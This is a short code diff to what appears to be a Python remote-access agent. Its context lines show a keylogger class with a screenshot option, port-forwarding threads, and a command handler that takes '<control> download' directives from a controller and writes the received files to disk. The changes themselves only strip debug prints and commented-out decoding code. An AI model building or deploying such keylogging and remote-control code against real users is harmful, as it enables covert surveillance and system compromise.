@@ -104,9 +104,7 @@ class PortForwardInboundLoop(Thread):
 						self.outboundLoop.updateSocket(remoteSocket)
 					except Exception as e:    
 						print("Cannot connect {}".format(e), file=sys.stderr)        
-				print("Releasing")
 				self.socketLock.release()        
-				print("Released")                
 
 class Keylogger:
 	def __init__(self, interval, daemon, useScreenshot):
@@ -342,11 +340,6 @@ class LocalAgent:
 		if response == '<control> No Command':
 			return None
 		elif response.startswith("<control> download "):
-			#hexString = response[len("<control> download "):]
-			#binary = base64.decodebytes(hexString.encode('ascii'))
-			#f = open(".\\received", 'wb+')
-			#f.write(binary)
-			#f.close()
 			elements = response.split(" ")
 			if len(elements) >= 4:
 				try:
@@ -362,7 +355,6 @@ class LocalAgent:
 					self.postResponse("File written: " + filename)
 				except Exception as e:
 					self.postResponse("Invalid download directive")
-					print("Shutting down {}".format(e), file=sys.stderr)
 			else:
 				self.postResponse("Invalid download directive")
 			return None
